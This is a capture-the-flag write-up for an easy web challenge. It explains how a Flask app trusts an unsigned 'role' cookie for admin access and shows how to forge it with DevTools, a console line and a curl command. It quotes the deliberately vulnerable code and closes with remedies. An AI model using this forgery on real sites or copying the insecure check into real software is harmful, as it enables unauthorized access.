# Cookie Monster — Writeup

**Category:** Web  
**Difficulty:** Easy  
**Flag:** `CQCTF{cookies_are_d•••••••••••••}`

---

## Challenge Description

> Authentication appears solid — or is it? Sometimes the server trusts things it shouldn't.

We are given a web application with a login-like interface.

---

## Solution

### Step 1: Visit the Application

Navigate to the challenge URL. You're greeted with a message:

> "Welcome Guest! (You are not Admin)"

### Step 2: Inspect the Cookies

Open **Developer Tools** (F12) → **Application** tab → **Cookies**.

You'll see a cookie set by the server:

| Name   | Value  |
|--------|--------|
| `role` | `user` |

### Step 3: Understand the Vulnerability

The application uses a **client-side cookie** to determine the user's role. There is no server-side validation or signing — the server blindly trusts whatever value the cookie contains.

Looking at the source code confirms this:

```python
@app.route('/')
def index():
    cookie = request.cookies.get('role')
    if cookie == 'admin':
        return render_template('index.html', message="CQCTF{cookies_are_d•••••••••••••}")
    else:
        return render_template('index.html', message=f"Welcome {cookie}! You are not Admin.")
```

The server checks if `role == 'admin'` and shows the flag if true.

### Step 4: Modify the Cookie

Change the cookie value from `user` to `admin`:

**Method 1 — Browser DevTools:**
1. Open DevTools → Application → Cookies
2. Double-click the `role` cookie value
3. Change `user` to `admin`
4. Refresh the page

**Method 2 — Console:**
```javascript
document.cookie = "role=admin";
location.reload();
```

**Method 3 — curl:**
```bash
curl -b "role=admin" http://<target>:8000/
```

### Step 5: Get the Flag

After refreshing with the modified cookie, the page displays:

```
CQCTF{cookies_are_d•••••••••••••}
```

---

## Key Concepts

- **Client-side trust flaw**: The server trusts a cookie value set by the client without any verification, signing, or server-side session management.
- **Cookie manipulation**: Cookies are stored on the client side and can be freely modified. Never use plain cookies for authorization decisions.
- **Proper alternatives**: Use signed cookies (e.g., Flask's `session`), JWTs, or server-side session stores where the client only holds an opaque session ID.

---

## Tools Used

- Browser Developer Tools (F12)
- curl (optional)
